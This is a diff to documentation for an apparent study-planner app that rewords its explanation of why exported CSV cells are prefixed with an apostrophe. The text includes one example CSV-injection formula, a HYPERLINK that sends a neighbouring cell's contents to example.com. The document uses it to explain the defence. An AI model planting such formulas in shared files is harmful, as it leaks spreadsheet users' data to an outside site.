@@ -40,9 +40,9 @@ Linear algebra,2026-10-24,60,no
 **Why the apostrophe.** A spreadsheet that opens a CSV file treats a cell beginning with `=`, `+`, `-`
 or `@` as a formula and runs it. A course named `=HYPERLINK("https://example.com/?"&A2,"Open")` would
 become a link that sends the cell beside it to another site when somebody clicks it, and other formulas
-have done worse. The names in the planner are written by its owner, so the danger is small here; in an
+have done worse. The names in the planner are written by its owner, so the danger is small here. In an
 application where the text comes from other people, it is a real attack, called **CSV injection**, and
-the apostrophe, which makes the spreadsheet show the text as text, is the usual defence.
+the usual defence is the apostrophe, which makes the spreadsheet show the text as text.
 
 ## A link to it
 
